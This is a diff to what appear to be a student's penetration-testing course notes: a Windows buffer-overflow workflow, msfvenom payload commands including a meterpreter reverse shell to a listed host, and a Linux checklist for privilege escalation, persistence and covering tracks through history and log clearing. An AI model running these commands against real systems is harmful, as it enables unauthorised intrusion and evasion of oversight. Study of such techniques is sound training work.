@@ -516,6 +516,9 @@ msfvenom -p linux/x86/exec CMD=whoami -b '\x00' -f python  (payload)
 ---------------------------------------------------------------------------------------------
 day 6) windows
 
+
+use string length 2500
+
 steps 
 -------------
 start immunity bugger 
@@ -529,6 +532,98 @@ type this !mona jmp -r esp -m "<the dll>"
 convert address to big endian 
 make payload :  msfvenom -p windows/meterpreter/reverse_tcp lhost=10.50.41.112 lport=4444 -b "\x00" -f python 
 msfconsole: use multi/handler set payload to what we used, set lhost to 0.0.0.0 and lport to the one we used, run 
+
+
+-------------------------------------------------------------------------------------------------------------------------------------------------------
+
+Day 7) 
+
+Linux privlage exploitation
+------------------------------
+
+privilage esclation, persistence, and covering your tracks 
+- adding and hijacking accounts
+- boot process
+- cron job (Important for test)
+- ssh keys
+
+
+
+privilage esclation
+-------------------------
+- enumeration for privilage esclation
+    - sudo -l (see what the user can do)
+      - ls -la /etc/sudoers (master file for permistions)
+      - sudo !!
+    - id (look for wheel its a priv group)
+    - SUID/GUID
+        - execute perms as owner if its set.
+        - find / -type f -perm /4000 -ls 2> /dev/null  (find all SUID bits set)
+        - https://gtfobins.github.io/  (plug in different commands) 
+
+
+Insecure permissions 
+----------------------------
+- CRON (first place to look on test) 
+  - https://crontab.guru/ (helps with what the job is doing)
+  - https://www.adminschoice.com/crontab-quick-reference (indepth CRON)
+  - /etc/crontab
+  - /var/spool/cron/crontabs,atjobs
+  - hijack a cron job 
+- world-writable files and directories
+  - /tmp (perm 777)
+  - /var/tmp
+  - /run
+  - /dev/shm
+  - ll , ls -latr
+- dot'.' PATH
+  - echo $PATH
+
+
+presistance
+---------------------
+- users
+- init
+- keys
+- cronjob/ cron 
+- adding or hijacking accounts
+  - adding is new user to the environment
+  - hijacking is taking conrol of a newer users
+- boot process
+  - /etc/systemd/system
+  - /etc/systemd/startup 
+  - /etc/systemv/system 
+  - /etc/init.d/acpid
+
+
+
+covering your tracks
+------------------------
+- auditing and logging
+- log cleaning
+  - testing
+- atifact
+  - whats left behing
+  - ex) logs, tools,
+- unset HISTFILE
+- ps -p1
+- ausearch -p 22
+- journalctl --verify
+- /etc/rsyslog.conf , /etc/rsyslog.d 
+
+
+
+
+
+
+
+
+
+
+
+
+
+
 
 
 
